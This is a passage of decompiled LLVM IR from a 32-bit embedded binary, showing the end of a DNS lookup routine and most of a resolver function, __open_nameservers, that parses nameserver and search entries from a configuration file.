  store i32 %v0_1000dea0, i32* @r20, align 4
  br label %dec_label_pc_1000dea4

dec_label_pc_1000dea4:                            ; preds = %dec_label_pc_1000dc40, %dec_label_pc_1000de94
  %v0_1000dea4 = load i32, i32* @r19, align 4
  %v3_1000dea4 = icmp eq i32 %v0_1000dea4, -1
  br i1 %v3_1000dea4, label %dec_label_pc_1000deb4, label %dec_label_pc_1000deac

dec_label_pc_1000deac:                            ; preds = %dec_label_pc_1000dea4
  store i32 268492468, i32* @lr, align 4
  %v1_1000deb0 = call i32 @__libc_close(i32 %v0_1000dea4)
  br label %dec_label_pc_1000deb4

dec_label_pc_1000deb4:                            ; preds = %dec_label_pc_1000dea4, %dec_label_pc_1000deac
  %v0_1000deb4 = load i32, i32* @r21, align 4
  store i32 %v0_1000deb4, i32* @r3, align 4
  store i32 -1, i32* @r27, align 4
  store i32 268492480, i32* @lr, align 4
  %v0_1000debc = call i32 @free()
  %v0_1000dec0 = load i32, i32* @r30, align 4
  store i32 %v0_1000dec0, i32* @r3, align 4
  store i32 268492488, i32* @lr, align 4
  %v0_1000dec4 = call i32 @free()
  %v0_1000dec8 = load i32, i32* @r26, align 4
  %v3_1000dec8 = icmp eq i32 %v0_1000dec8, -1
  br i1 %v3_1000dec8, label %dec_label_pc_1000df14, label %dec_label_pc_1000ded0

dec_label_pc_1000ded0:                            ; preds = %dec_label_pc_1000deb4
  store i32 ptrtoint (i32* @global_var_100297b8.368 to i32), i32* %r29.global-to-local, align 4
  %v2_1000dedc = ptrtoint i32* %stack_var_-228 to i32
  br label %dec_label_pc_1000dee4

dec_label_pc_1000dee4:                            ; preds = %dec_label_pc_1000dde0, %dec_label_pc_1000ded0
  %storemerge68 = phi i32 [ %v2_1000dedc, %dec_label_pc_1000ded0 ], [ %v2_1000d914, %dec_label_pc_1000dde0 ]
  %v1_1000dee8.pre-phi = phi i32 [ %v2_1000dedc, %dec_label_pc_1000ded0 ], [ %v2_1000d914, %dec_label_pc_1000dde0 ]
  store i32 %storemerge68, i32* %r28.global-to-local, align 4
  store i32 %v1_1000dee8.pre-phi, i32* @r3, align 4
  %v0_1000deec = call i32 @__pthread_return_void()
  %v0_1000def4 = call i32 @__pthread_return_0()
  %v0_1000defc = load i32, i32* @r26, align 4
  store i32 %v0_1000defc, i32* @global_var_10023578.369, align 4
  store i32 %v1_1000dee8.pre-phi, i32* @r3, align 4
  %v0_1000df0c = load i32, i32* @r20, align 4
  %v1_1000df0c = trunc i32 %v0_1000df0c to i16
  store i16 %v1_1000df0c, i16* @global_var_10023494.370, align 2
  %v0_1000df10 = call i32 @__pthread_return_void()
  br label %dec_label_pc_1000df14

dec_label_pc_1000df14:                            ; preds = %dec_label_pc_1000deb4, %dec_label_pc_1000dee4
  store i32 %v0_1000d894, i32* %r0.global-to-local, align 4
  %v0_1000df18 = load i32, i32* @r27, align 4
  ret i32 %v0_1000df18

; uselistorder directives
  uselistorder i32 %v1_1000dee8.pre-phi, { 1, 0 }
  uselistorder i32 %v2_1000de64, { 1, 0 }
  uselistorder i32 %v0_1000ddd8, { 1, 0 }
  uselistorder i32 %v1_1000ddb4, { 1, 0 }
  uselistorder i32 %stack_var_-88.118, { 1, 0, 2 }
  uselistorder i32 %v0_1000dc80, { 1, 0 }
  uselistorder i32 %v1_1000dda4, { 1, 0 }
  uselistorder i32 %v0_1000dd6c, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1000dd30, { 1, 0 }
  uselistorder i32 %v0_1000dcbc, { 2, 1, 0 }
  uselistorder i32 %v0_1000dc58, { 1, 0 }
  uselistorder i32 %v2_1000dc4c, { 0, 2, 1, 3 }
  uselistorder i32 %v4_1000db70, { 1, 0 }
  uselistorder i32 %v1_1000da70, { 1, 0 }
  uselistorder i32 %v1_1000da44, { 1, 0 }
  uselistorder i32 %v1_1000da10, { 1, 0 }
  uselistorder i32 %v1_1000d9a8, { 1, 0 }
  uselistorder i32 %v2_1000d914, { 0, 1, 5, 6, 7, 2, 3, 4, 8, 9, 10, 11, 12 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2, 3 }
  uselistorder i16* %stack_var_-212, { 0, 1, 4, 3, 2 }
  uselistorder i32* %stack_var_-184, { 1, 0, 2 }
  uselistorder i32 %tmp36, { 1, 0, 2 }
  uselistorder i32 %tmp35, { 6, 5, 0, 1, 2, 4, 3 }
  uselistorder i32 %tmp29, { 1, 0 }
  uselistorder i32 %tmp28, { 0, 2, 1 }
  uselistorder i32* %r29.global-to-local, { 1, 2, 3, 4, 5, 6, 8, 7, 0, 9, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i32* %r28.global-to-local, { 0, 2, 3, 5, 4, 1, 6, 7, 8, 9 }
  uselistorder i32* %r18.global-to-local, { 0, 3, 2, 1, 5, 4, 6 }
  uselistorder i32* %r17.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r16.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 5, 16, 6, 7, 8, 11, 9, 10, 12, 13, 14, 15, 2, 17, 0, 1, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 4, 5, 3, 2, 1, 0 }
  uselistorder i32 101, { 2, 0, 1 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 0, 4, 3, 5, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @socket, { 0, 7, 6, 5, 4, 3, 2, 8, 1 }
  uselistorder i32 17, { 2, 3, 12, 4, 9, 10, 5, 11, 6, 16, 17, 13, 14, 15, 0, 1, 7, 8 }
  uselistorder i32 (i32)* @inet_addr, { 0, 3, 2, 1 }
  uselistorder i32 53, { 2, 0, 1 }
  uselistorder i16 10, { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32)* @strncpy, { 0, 2, 1, 3 }
  uselistorder i32 (i32)* @__libc_close, { 13, 12, 9, 14, 19, 18, 17, 16, 15, 11, 10, 0, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i16* @global_var_10023494.370, { 1, 0 }
  uselistorder i32 1025, { 2, 3, 1, 7, 0, 4, 5, 6 }
  uselistorder i32 512, { 2, 6, 0, 1, 7, 3, 4, 5 }
  uselistorder label %dec_label_pc_1000df14, { 1, 0 }
  uselistorder label %dec_label_pc_1000dee4, { 1, 0 }
  uselistorder label %dec_label_pc_1000deb4, { 1, 0 }
  uselistorder label %dec_label_pc_1000dea4, { 1, 0 }
  uselistorder label %dec_label_pc_1000de94, { 5, 0, 3, 2, 1, 4 }
  uselistorder label %dec_label_pc_1000d970.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_1000de78, { 1, 0 }
  uselistorder label %dec_label_pc_1000de60, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_1000de7cthread-pre-split.backedge, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000de08, { 6, 2, 3, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_1000dde0, { 1, 0 }
  uselistorder label %dec_label_pc_1000ddbc, { 2, 5, 4, 6, 3, 0, 1 }
  uselistorder label %dec_label_pc_1000ddb4, { 1, 0 }
  uselistorder label %dec_label_pc_1000dda0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000dd0c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000dc48, { 1, 0 }
  uselistorder label %dec_label_pc_1000dc40, { 1, 0 }
  uselistorder label %dec_label_pc_1000dae4, { 1, 0 }
  uselistorder label %dec_label_pc_1000da5c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000d980, { 1, 0 }
}

define i32 @__open_nameservers() local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-164 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %v2_1000df4c = ptrtoint i32* %stack_var_-200 to i32
  store i32 %v2_1000df4c, i32* @r3, align 4
  %v0_1000df54 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_10023498.321 to i32), i32* %r3.global-to-local, align 4
  %v0_1000df5c = call i32 @__pthread_return_0()
  store i32 %v0_1000df5c, i32* %r3.global-to-local, align 4
  %v3_1000df64 = load i32, i32* @global_var_1002357c.322, align 4
  %v2_1000df68 = icmp sgt i32 %v3_1000df64, 0
  br i1 %v2_1000df68, label %dec_label_pc_1000e1e0, label %dec_label_pc_1000df70

dec_label_pc_1000df70:                            ; preds = %entry
  store i32 ptrtoint ([17 x i8]* @global_var_10012b00.383 to i32), i32* %r3.global-to-local, align 4
  store i32 268492680, i32* @lr, align 4
  %v3_1000df84 = call i32 @__GI_fopen(i32 ptrtoint ([17 x i8]* @global_var_10012b00.383 to i32), i32 ptrtoint (i32* @global_var_10012b14.382 to i32))
  store i32 %v3_1000df84, i32* %r3.global-to-local, align 4
  store i32 %v3_1000df84, i32* @r26, align 4
  %v3_1000df88 = icmp eq i32 %v3_1000df84, 0
  br i1 %v3_1000df88, label %dec_label_pc_1000df90, label %dec_label_pc_1000e1a4.preheader

dec_label_pc_1000df90:                            ; preds = %dec_label_pc_1000df70
  %v0_1000df94 = load i32, i32* @r31, align 4
  store i32 ptrtoint ([24 x i8]* @global_var_10012b18.384 to i32), i32* %r3.global-to-local, align 4
  store i32 268492704, i32* @lr, align 4
  %v3_1000df9c = call i32 @__GI_fopen(i32 ptrtoint ([24 x i8]* @global_var_10012b18.384 to i32), i32 %v0_1000df94)
  store i32 %v3_1000df9c, i32* %r3.global-to-local, align 4
  store i32 %v3_1000df9c, i32* @r26, align 4
  %v3_1000dfa0 = icmp eq i32 %v3_1000df9c, 0
  br i1 %v3_1000dfa0, label %dec_label_pc_1000e1d4, label %dec_label_pc_1000e1a4.preheader

dec_label_pc_1000e1a4.preheader:                  ; preds = %dec_label_pc_1000df70, %dec_label_pc_1000df90
  %v0_1000e1b016 = phi i32 [ %v3_1000df84, %dec_label_pc_1000df70 ], [ %v3_1000df9c, %dec_label_pc_1000df90 ]
  %v2_1000e1a4 = ptrtoint i32* %stack_var_-164 to i32
  %v1_1000dfb02 = bitcast i32* %stack_var_-164 to i8*
  %v3_1000e094 = inttoptr i32 %tmp to i8*
  br label %dec_label_pc_1000e1a4

dec_label_pc_1000dfac:                            ; preds = %dec_label_pc_1000dfc4
  %v1_1000dfac = add i32 %v0_1000e06c9, 1
  store i32 %v1_1000dfac, i32* %r3.global-to-local, align 4
  %v1_1000dfb0 = inttoptr i32 %v1_1000dfac to i8*
  %v2_1000dfb0 = load i8, i8* %v1_1000dfb0, align 1
  %v3_1000dfb0 = zext i8 %v2_1000dfb0 to i32
  store i32 %v3_1000dfb0, i32* %r11.global-to-local, align 4
  %v3_1000dfb8 = icmp eq i8 %v2_1000dfb0, 0
  br i1 %v3_1000dfb8, label %dec_label_pc_1000e1a4.backedge, label %dec_label_pc_1000dfc4

dec_label_pc_1000dfc4:                            ; preds = %dec_label_pc_1000dfc4.lr.ph, %dec_label_pc_1000dfac
  %v0_1000dfc8.in = phi i32 [ %v3_1000dfb04, %dec_label_pc_1000dfc4.lr.ph ], [ %v3_1000dfb0, %dec_label_pc_1000dfac ]
  %v0_1000dfdc = phi i32 [ %v3_1000dfb04, %dec_label_pc_1000dfc4.lr.ph ], [ %v3_1000dfb0, %dec_label_pc_1000dfac ]
  %v0_1000e06c9 = phi i32 [ %v2_1000e1a4, %dec_label_pc_1000dfc4.lr.ph ], [ %v1_1000dfac, %dec_label_pc_1000dfac ]
  %v0_1000dfc8 = mul nuw nsw i32 %v0_1000dfc8.in, 2
  %v2_1000dfc8 = add i32 %v0_1000dfc8, %v3_1000dfc4.pre
  %v3_1000dfc8 = inttoptr i32 %v2_1000dfc8 to i16*
  %v4_1000dfc8 = load i16, i16* %v3_1000dfc8, align 2
  %v1_1000dfcc = and i16 %v4_1000dfc8, 32
  %v3_1000dfcc = icmp eq i16 %v1_1000dfcc, 0
  br i1 %v3_1000dfcc, label %dec_label_pc_1000dfd4, label %dec_label_pc_1000dfac

dec_label_pc_1000dfd4:                            ; preds = %dec_label_pc_1000dfc4
  %v3_1000dfd4 = icmp eq i32 %v0_1000dfdc, 10
  br i1 %v3_1000dfd4, label %dec_label_pc_1000e1a4.backedge, label %dec_label_pc_1000dfdc

dec_label_pc_1000e1a4.backedge:                   ; preds = %dec_label_pc_1000dfac, %dec_label_pc_1000e158, %dec_label_pc_1000e160, %dec_label_pc_1000e198, %dec_label_pc_1000dfb0.preheader, %dec_label_pc_1000dfd4, %dec_label_pc_1000dfdc, %dec_label_pc_1000e100
  %v0_1000e1b0.pre = load i32, i32* @r26, align 4
  br label %dec_label_pc_1000e1a4

dec_label_pc_1000dfdc:                            ; preds = %dec_label_pc_1000dfd4
  %v3_1000dfdc = icmp eq i32 %v0_1000dfdc, 35
  br i1 %v3_1000dfdc, label %dec_label_pc_1000e1a4.backedge, label %dec_label_pc_1000dfe4

dec_label_pc_1000dfe4:                            ; preds = %dec_label_pc_1000dfdc
  store i32 0, i32* @r27, align 4
  store i32 %v2_1000df4c, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v1_1000e06c10 = inttoptr i32 %v0_1000e06c9 to i8*
  %v2_1000e06c11 = load i8, i8* %v1_1000e06c10, align 1
  %v3_1000e07014 = icmp eq i8 %v2_1000e06c11, 0
  br i1 %v3_1000e07014, label %dec_label_pc_1000e080, label %dec_label_pc_1000e078

dec_label_pc_1000dff8:                            ; preds = %dec_label_pc_1000e078
  %v1_1000dff8 = mul i32 %v0_1000dff8, 4
  %v3_1000dffc = load i32, i32* @global_var_100234d8, align 4
  store i32 %v3_1000dffc, i32* %r11.global-to-local, align 4
  %v1_1000e000 = load i32, i32* %r6.global-to-local, align 4
  %v2_1000e000 = add i32 %v1_1000e000, %v1_1000dff8
  %v2_1000e004 = add i32 %v2_1000e000, 16
  %v3_1000e004 = inttoptr i32 %v2_1000e004 to i32*
  store i32 %v0_1000e004, i32* %v3_1000e004, align 4
  %v0_1000e010.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000e010

dec_label_pc_1000e00c:                            ; preds = %dec_label_pc_1000e024
  %v1_1000e00c = add i32 %v0_1000e00c, 1
  store i32 %v1_1000e00c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000e010

dec_label_pc_1000e010:                            ; preds = %dec_label_pc_1000dff8, %dec_label_pc_1000e00c
  %v0_1000e00c = phi i32 [ %v0_1000e010.pre, %dec_label_pc_1000dff8 ], [ %v1_1000e00c, %dec_label_pc_1000e00c ]
  %v1_1000e010 = inttoptr i32 %v0_1000e00c to i8*
  %v2_1000e010 = load i8, i8* %v1_1000e010, align 1
  %v3_1000e014 = icmp eq i8 %v2_1000e010, 0
  br i1 %v3_1000e014, label %dec_label_pc_1000e040, label %dec_label_pc_1000e024

dec_label_pc_1000e024:                            ; preds = %dec_label_pc_1000e010
  %v3_1000e01c = icmp eq i8 %v2_1000e010, 10
  %v3_1000e010 = zext i8 %v2_1000e010 to i32
  %v1_1000e018 = mul nuw nsw i32 %v3_1000e010, 2
  %v1_1000e024 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000e024 = add i32 %v1_1000e024, %v1_1000e018
  %v3_1000e024 = inttoptr i32 %v2_1000e024 to i16*
  %v4_1000e024 = load i16, i16* %v3_1000e024, align 2
  %v1_1000e028 = and i16 %v4_1000e024, 32
  %v3_1000e028.not = icmp ne i16 %v1_1000e028, 0
  %brmerge = or i1 %v3_1000e01c, %v3_1000e028.not
  br i1 %brmerge, label %dec_label_pc_1000e040, label %dec_label_pc_1000e00c

dec_label_pc_1000e038:                            ; preds = %dec_label_pc_1000e054
  %v0_1000e038 = load i32, i32* %r7.global-to-local, align 4
  %v1_1000e038 = trunc i32 %v0_1000e038 to i8
  store i8 %v1_1000e038, i8* %v1_1000e040, align 1
  %v0_1000e03c = load i32, i32* %r3.global-to-local, align 4
  %v1_1000e03c = add i32 %v0_1000e03c, 1
  store i32 %v1_1000e03c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000e040

dec_label_pc_1000e040:                            ; preds = %dec_label_pc_1000e024, %dec_label_pc_1000e010, %dec_label_pc_1000e038
  %v0_1000e06c = phi i32 [ %v1_1000e03c, %dec_label_pc_1000e038 ], [ %v0_1000e00c, %dec_label_pc_1000e010 ], [ %v0_1000e00c, %dec_label_pc_1000e024 ]
  %v1_1000e040 = inttoptr i32 %v0_1000e06c to i8*
  %v2_1000e040 = load i8, i8* %v1_1000e040, align 1
  %v3_1000e040 = zext i8 %v2_1000e040 to i32
  %v3_1000e044 = icmp eq i8 %v2_1000e040, 0
  %v1_1000e048 = mul nuw nsw i32 %v3_1000e040, 2
  store i32 %v1_1000e048, i32* %r11.global-to-local, align 4
  br i1 %v3_1000e044, label %dec_label_pc_1000e068, label %dec_label_pc_1000e054

dec_label_pc_1000e054:                            ; preds = %dec_label_pc_1000e040
  %v3_1000e04c = icmp eq i8 %v2_1000e040, 10
  %v3_1000e054 = load i32, i32* @global_var_100234d8, align 4
  %v2_1000e058 = add i32 %v3_1000e054, %v1_1000e048
  %v3_1000e058 = inttoptr i32 %v2_1000e058 to i16*
  %v4_1000e058 = load i16, i16* %v3_1000e058, align 2
  %v1_1000e05c = and i16 %v4_1000e058, 32
  %v3_1000e05c.not = icmp ne i16 %v1_1000e05c, 0
  %brmerge27 = or i1 %v3_1000e04c, %v3_1000e05c.not
  br i1 %brmerge27, label %dec_label_pc_1000e038, label %dec_label_pc_1000e068

dec_label_pc_1000e068:                            ; preds = %dec_label_pc_1000e054, %dec_label_pc_1000e040
  %v0_1000e068 = load i32, i32* @r27, align 4
  %v1_1000e068 = add i32 %v0_1000e068, 1
  store i32 %v1_1000e068, i32* @r27, align 4
  %v2_1000e06c = load i8, i8* %v1_1000e040, align 1
  %v3_1000e070 = icmp eq i8 %v2_1000e06c, 0
  br i1 %v3_1000e070, label %dec_label_pc_1000e080, label %dec_label_pc_1000e078

dec_label_pc_1000e078:                            ; preds = %dec_label_pc_1000dfe4, %dec_label_pc_1000e068
  %v0_1000e004 = phi i32 [ %v0_1000e06c, %dec_label_pc_1000e068 ], [ %v0_1000e06c9, %dec_label_pc_1000dfe4 ]
  %v0_1000dff8 = phi i32 [ %v1_1000e068, %dec_label_pc_1000e068 ], [ 0, %dec_label_pc_1000dfe4 ]
  %tmp33 = icmp slt i32 %v0_1000dff8, 5
  br i1 %tmp33, label %dec_label_pc_1000dff8, label %dec_label_pc_1000e080

dec_label_pc_1000e080:                            ; preds = %dec_label_pc_1000e068, %dec_label_pc_1000e078, %dec_label_pc_1000dfe4
  store i32 %tmp, i32* @r30, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_10012b30.385 to i32), i32* @r4, align 4
  store i32 1, i32* @r31, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v4_1000e094 = call i32 @__GI_strcoll(i8* %v3_1000e094, i32 ptrtoint ([11 x i8]* @global_var_10012b30.385 to i32))
  store i32 %v4_1000e094, i32* %r3.global-to-local, align 4
  %v3_1000e098 = icmp eq i32 %v4_1000e094, 0
  br i1 %v3_1000e098, label %dec_label_pc_1000e0c4, label %dec_label_pc_1000e0e8

dec_label_pc_1000e0a4:                            ; preds = %dec_label_pc_1000e0dc
  %v1_1000e0a4 = add i32 %v2_1000e0cc, 24
  %v2_1000e0a4 = inttoptr i32 %v1_1000e0a4 to i32*
  %v3_1000e0a4 = load i32, i32* %v2_1000e0a4, align 4
  store i32 %v3_1000e0a4, i32* %r3.global-to-local, align 4
  store i32 268492972, i32* @lr, align 4
  %v1_1000e0a8 = call i32 @__GI_strdup(i32 %v3_1000e0a4)
  store i32 %v1_1000e0a8, i32* %r3.global-to-local, align 4
  %v0_1000e0b0 = load i32, i32* @r29, align 4
  %v1_1000e0b0 = add i32 %v0_1000e0b0, 1
  store i32 %v1_1000e0b0, i32* %r11.global-to-local, align 4
  %v1_1000e0b4 = mul i32 %v0_1000e0b0, 4
  store i32 %v1_1000e0b0, i32* @global_var_1002357c.322, align 4
  %v3_1000e0c0 = add i32 %v1_1000e0b4, ptrtoint (i32* @global_var_10029878.323 to i32)
  %v4_1000e0c0 = inttoptr i32 %v3_1000e0c0 to i32*
  store i32 %v1_1000e0a8, i32* %v4_1000e0c0, align 4
  br label %dec_label_pc_1000e0c4

dec_label_pc_1000e0c4:                            ; preds = %dec_label_pc_1000e080, %dec_label_pc_1000e0a4
  %v0_1000e0c4 = load i32, i32* @r31, align 4
  %v1_1000e0c4 = load i32, i32* @r27, align 4
  %v2_1000e0c4 = icmp slt i32 %v0_1000e0c4, %v1_1000e0c4
  %v1_1000e0c8 = mul i32 %v0_1000e0c4, 4
  %v0_1000e0cc = load i32, i32* @r1, align 4
  %v2_1000e0cc = add i32 %v0_1000e0cc, %v1_1000e0c8
  br i1 %v2_1000e0c4, label %dec_label_pc_1000e0dc, label %dec_label_pc_1000e0e8

dec_label_pc_1000e0dc:                            ; preds = %dec_label_pc_1000e0c4
  %v3_1000e0dc = load i32, i32* @global_var_1002357c.322, align 4
  %tmp35 = icmp slt i32 %v3_1000e0dc, 3
  br i1 %tmp35, label %dec_label_pc_1000e0a4, label %dec_label_pc_1000e0e8

dec_label_pc_1000e0e8:                            ; preds = %dec_label_pc_1000e0dc, %dec_label_pc_1000e0c4, %dec_label_pc_1000e080
  %v0_1000e0ec = load i32, i32* @r30, align 4
  store i32 %v0_1000e0ec, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_10012b3c.386 to i32), i32* @r4, align 4
  %v3_1000e0f4 = inttoptr i32 %v0_1000e0ec to i8*
  %v4_1000e0f4 = call i32 @__GI_strcoll(i8* %v3_1000e0f4, i32 ptrtoint ([7 x i8]* @global_var_10012b3c.386 to i32))
  store i32 %v4_1000e0f4, i32* %r3.global-to-local, align 4
  %v3_1000e0f8 = icmp eq i32 %v4_1000e0f4, 0
  br i1 %v3_1000e0f8, label %dec_label_pc_1000e138.preheader, label %dec_label_pc_1000e100

dec_label_pc_1000e100:                            ; preds = %dec_label_pc_1000e0e8
  %v0_1000e104 = load i32, i32* @r30, align 4
  store i32 %v0_1000e104, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_10012b44.387 to i32), i32* @r4, align 4
  %v3_1000e10c = inttoptr i32 %v0_1000e104 to i8*
  %v4_1000e10c = call i32 @__GI_strcoll(i8* %v3_1000e10c, i32 ptrtoint ([7 x i8]* @global_var_10012b44.387 to i32))
  store i32 %v4_1000e10c, i32* %r3.global-to-local, align 4
  %v3_1000e110 = icmp eq i32 %v4_1000e10c, 0
  br i1 %v3_1000e110, label %dec_label_pc_1000e138.preheader, label %dec_label_pc_1000e1a4.backedge

dec_label_pc_1000e138.preheader:                  ; preds = %dec_label_pc_1000e0e8, %dec_label_pc_1000e100
  store i32 ptrtoint (i32* @global_var_10029868.374 to i32), i32* @r31, align 4
  %v3_1000e14441 = load i32, i32* @global_var_10023580.372, align 4
  %v2_1000e14843 = icmp sgt i32 %v3_1000e14441, 0
  %v1_1000e14c45 = add i32 %v3_1000e14441, -1
  %v1_1000e15046 = mul i32 %v1_1000e14c45, 4
  store i32 %v1_1000e15046, i32* %r11.global-to-local, align 4
  br i1 %v2_1000e14843, label %dec_label_pc_1000e11c, label %dec_label_pc_1000e158

dec_label_pc_1000e11c:                            ; preds = %dec_label_pc_1000e138.preheader, %dec_label_pc_1000e11c
  %v1_1000e15048 = phi i32 [ %v1_1000e150, %dec_label_pc_1000e11c ], [ %v1_1000e15046, %dec_label_pc_1000e138.preheader ]
  %v1_1000e14c47 = phi i32 [ %v1_1000e14c, %dec_label_pc_1000e11c ], [ %v1_1000e14c45, %dec_label_pc_1000e138.preheader ]
  %v2_1000e11c = add i32 %v1_1000e15048, ptrtoint (i32* @global_var_10029868.374 to i32)
  %v3_1000e11c = inttoptr i32 %v2_1000e11c to i32*
  %v4_1000e11c = load i32, i32* %v3_1000e11c, align 4
  store i32 %v4_1000e11c, i32* @r3, align 4
  store i32 %v1_1000e14c47, i32* @global_var_10023580.372, align 4
  store i32 268493096, i32* @lr, align 4
  %v0_1000e124 = call i32 @free()
  store i32 %v0_1000e124, i32* %r3.global-to-local, align 4
  %v3_1000e128 = load i32, i32* @global_var_10023580.372, align 4
  %v1_1000e130 = mul i32 %v3_1000e128, 4
  %v1_1000e134 = load i32, i32* @r31, align 4
  %v3_1000e134 = add i32 %v1_1000e134, %v1_1000e130
  %v4_1000e134 = inttoptr i32 %v3_1000e134 to i32*
  store i32 0, i32* %v4_1000e134, align 4
  store i32 ptrtoint (i32* @global_var_10029868.374 to i32), i32* @r31, align 4
  %v3_1000e144 = load i32, i32* @global_var_10023580.372, align 4
  %v2_1000e148 = icmp sgt i32 %v3_1000e144, 0
  %v1_1000e14c = add i32 %v3_1000e144, -1
  %v1_1000e150 = mul i32 %v1_1000e14c, 4
  store i32 %v1_1000e150, i32* %r11.global-to-local, align 4
  br i1 %v2_1000e148, label %dec_label_pc_1000e11c, label %dec_label_pc_1000e158

dec_label_pc_1000e158:                            ; preds = %dec_label_pc_1000e11c, %dec_label_pc_1000e138.preheader
  %v3_1000e19859 = phi i32 [ %v3_1000e14441, %dec_label_pc_1000e138.preheader ], [ %v3_1000e144, %dec_label_pc_1000e11c ]
  %v1_1000e18049 = load i32, i32* @r27, align 4
  %v2_1000e18050 = icmp sgt i32 %v1_1000e18049, 1
  %v0_1000e18853 = load i32, i32* @r1, align 4
  %v2_1000e18854 = add i32 %v0_1000e18853, 4
  br i1 %v2_1000e18050, label %dec_label_pc_1000e198, label %dec_label_pc_1000e1a4.backedge

dec_label_pc_1000e160:                            ; preds = %dec_label_pc_1000e198
  %v1_1000e160 = add i32 %v2_1000e18855, 24
  %v2_1000e160 = inttoptr i32 %v1_1000e160 to i32*
  %v3_1000e160 = load i32, i32* %v2_1000e160, align 4
  store i32 %v3_1000e160, i32* %r3.global-to-local, align 4
  store i32 268493160, i32* @lr, align 4
  %v1_1000e164 = call i32 @__GI_strdup(i32 %v3_1000e160)
  store i32 %v1_1000e164, i32* %r3.global-to-local, align 4
  %v0_1000e16c = load i32, i32* @r29, align 4
  %v1_1000e16c = add i32 %v0_1000e16c, 1
  store i32 %v1_1000e16c, i32* %r11.global-to-local, align 4
  %v1_1000e170 = mul i32 %v0_1000e16c, 4
  store i32 %v1_1000e16c, i32* @global_var_10023580.372, align 4
  %v3_1000e17c = add i32 %v1_1000e170, ptrtoint (i32* @global_var_10029868.374 to i32)
  %v4_1000e17c = inttoptr i32 %v3_1000e17c to i32*
  store i32 %v1_1000e164, i32* %v4_1000e17c, align 4
  %v0_1000e180.pre = load i32, i32* @r31, align 4
  %v1_1000e180 = load i32, i32* @r27, align 4
  %v2_1000e180 = icmp slt i32 %v0_1000e180.pre, %v1_1000e180
  br i1 %v2_1000e180, label %dec_label_pc_1000e160.dec_label_pc_1000e198_crit_edge, label %dec_label_pc_1000e1a4.backedge

dec_label_pc_1000e160.dec_label_pc_1000e198_crit_edge: ; preds = %dec_label_pc_1000e160
  %v0_1000e188 = load i32, i32* @r1, align 4
  %v1_1000e184 = mul i32 %v0_1000e180.pre, 4
  %v2_1000e188 = add i32 %v0_1000e188, %v1_1000e184
  %v3_1000e198.pre = load i32, i32* @global_var_10023580.372, align 4
  br label %dec_label_pc_1000e198

dec_label_pc_1000e198:                            ; preds = %dec_label_pc_1000e158, %dec_label_pc_1000e160.dec_label_pc_1000e198_crit_edge
  %v3_1000e198 = phi i32 [ %v3_1000e198.pre, %dec_label_pc_1000e160.dec_label_pc_1000e198_crit_edge ], [ %v3_1000e19859, %dec_label_pc_1000e158 ]
  %v2_1000e18855 = phi i32 [ %v2_1000e188, %dec_label_pc_1000e160.dec_label_pc_1000e198_crit_edge ], [ %v2_1000e18854, %dec_label_pc_1000e158 ]
  %tmp37 = icmp slt i32 %v3_1000e198, 4
  br i1 %tmp37, label %dec_label_pc_1000e160, label %dec_label_pc_1000e1a4.backedge

dec_label_pc_1000e1a4:                            ; preds = %dec_label_pc_1000e1a4.backedge, %dec_label_pc_1000e1a4.preheader
  %v0_1000e1b0 = phi i32 [ %v0_1000e1b0.pre, %dec_label_pc_1000e1a4.backedge ], [ %v0_1000e1b016, %dec_label_pc_1000e1a4.preheader ]
  store i32 %v2_1000e1a4, i32* %r3.global-to-local, align 4
  store i32 268493240, i32* @lr, align 4
  %v3_1000e1b4 = call i32 @fgets(i32 %v2_1000e1a4, i32 128, i32 %v0_1000e1b0)
  store i32 %v3_1000e1b4, i32* %r3.global-to-local, align 4
  %v3_1000e1b8 = icmp eq i32 %v3_1000e1b4, 0
  br i1 %v3_1000e1b8, label %dec_label_pc_1000e1c8, label %dec_label_pc_1000dfb0.preheader

dec_label_pc_1000dfb0.preheader:                  ; preds = %dec_label_pc_1000e1a4
  store i32 %v2_1000e1a4, i32* %r3.global-to-local, align 4
  %v2_1000dfb03 = load i8, i8* %v1_1000dfb02, align 4
  %v3_1000dfb04 = zext i8 %v2_1000dfb03 to i32
  store i32 %v3_1000dfb04, i32* %r11.global-to-local, align 4
  %v3_1000dfb86 = icmp eq i8 %v2_1000dfb03, 0
  br i1 %v3_1000dfb86, label %dec_label_pc_1000e1a4.backedge, label %dec_label_pc_1000dfc4.lr.ph

